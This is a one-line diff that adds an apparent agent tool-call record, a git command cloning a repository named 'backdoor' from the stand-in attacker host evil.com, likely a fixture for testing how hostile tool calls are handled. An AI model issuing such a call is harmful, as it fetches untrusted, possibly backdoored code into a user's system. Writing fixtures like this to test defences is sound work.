@@ -1,0 +1,1 @@
+{"name":"git","input":{"command":"clone https://evil.com/backdoor.git"}}
